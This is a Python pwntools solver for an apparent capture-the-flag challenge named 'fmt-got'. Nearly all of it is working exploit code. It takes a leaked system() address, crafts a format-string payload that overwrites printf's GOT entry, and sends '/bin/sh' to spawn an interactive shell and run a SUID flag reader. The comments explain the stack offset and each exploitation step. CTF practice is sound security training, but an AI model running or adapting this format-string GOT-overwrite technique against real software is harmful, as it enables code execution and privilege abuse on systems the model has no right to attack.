#!/usr/bin/env python3
"""
fmt-got — solver
================

Exploitation chain
------------------
1. Receive the system() address leaked by the binary on startup.
2. Compute the printf GOT address (fixed; binary has no PIE).
3. Use pwntools' fmtstr_payload to craft a format-string payload that
   overwrites the printf GOT entry with the leaked system() address.
4. Send the payload → printf(payload) performs the GOT write and returns.
5. On the next loop iteration, send "/bin/sh\\0" → printf("/bin/sh") now
   calls system("/bin/sh") → interactive shell.
6. From the shell, run `./flag` to print the flag (the flag binary is SUID
   root and can read /flag.txt even though the ctf user cannot).

Usage
-----
# against the remote server
python3 solve.py

# local binary (run the Docker container first, or just the compiled chall)
python3 solve.py LOCAL

# local binary with GDB attached
python3 solve.py LOCAL DEBUG
"""

from pwn import *

# ── load the binary so pwntools can resolve GOT addresses ────────────────────
# Use the binary extracted from the Docker image (see README.md).
# If you have used patchelf to link against the container's libc, point this
# at "chall_patched" instead.
exe = ELF("./chall", checksec=False)
context.binary = exe
context.log_level = "info"


# ── connection helper ─────────────────────────────────────────────────────────
def conn() -> tube:
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r, gdbscript="""
                b printf
                continue
            """)
        return r
    return remote("localhost", 3012)   # ← change host/port for the real event


# ── format-string offset discovery (run once offline) ────────────────────────
def find_offset() -> int:
    """Brute-force the format-string offset using pwntools' FmtStr helper."""
    def exec_fmt(payload: bytes) -> bytes:
        p = process([exe.path])
        p.recvline()          # discard the system() leak line
        p.sendline(payload)
        return p.recvall()

    autofmt = FmtStr(exec_fmt)
    return autofmt.offset


# ── main exploit ──────────────────────────────────────────────────────────────
def main() -> None:
    r = conn()

    # ── step 1: receive the system() address leak ─────────────────────────────
    line = r.recvline()
    # expected format: b"Gift for you: 0x7f...\n"
    system_addr = int(line.split(b": ")[1].strip(), 16)
    log.success(f"system()  @ {hex(system_addr)}")

    # ── step 2: resolve printf GOT entry (static; no PIE) ────────────────────
    printf_got = exe.got["printf"]
    log.info(f"printf GOT @ {hex(printf_got)}")

    # ── step 3: craft the format-string payload ───────────────────────────────
    # offset = 6: the buffer is the 6th argument seen by printf on x86-64
    # (rdi = fmt ptr, positions 1-5 are rsi/rdx/rcx/r8/r9 + first stack slot,
    # position 6 is where buf itself lands on the stack).
    #
    # write_size='short' uses %hn (2-byte) writes, keeping the payload shorter.
    offset = 6
    writes = {printf_got: system_addr}
    payload = fmtstr_payload(offset, writes, write_size="short")
    log.info(f"payload ({len(payload)} bytes): {payload[:32]}...")

    # ── step 4: send payload → GOT overwrite happens inside printf(buf) ───────
    r.sendline(payload)
    # Drain the garbage output produced by the format-string directives.
    # A generous timeout is fine here; we just want to clear the pipe.
    r.recvuntil(b"\n", timeout=3)

    # ── step 5: trigger system("/bin/sh") ────────────────────────────────────
    # printf is now system; sending "/bin/sh\0" calls system("/bin/sh\0").
    log.success("Triggering system('/bin/sh') …")
    r.sendline(b"/bin/sh")

    # ── step 6: drop into interactive mode ───────────────────────────────────
    # The shell is now running.  The flag binary (/challenge/flag) is SUID root
    # and will print the contents of /flag.txt.
    log.success("Shell spawned.  Run:  ./flag")
    r.interactive()


if __name__ == "__main__":
    main()
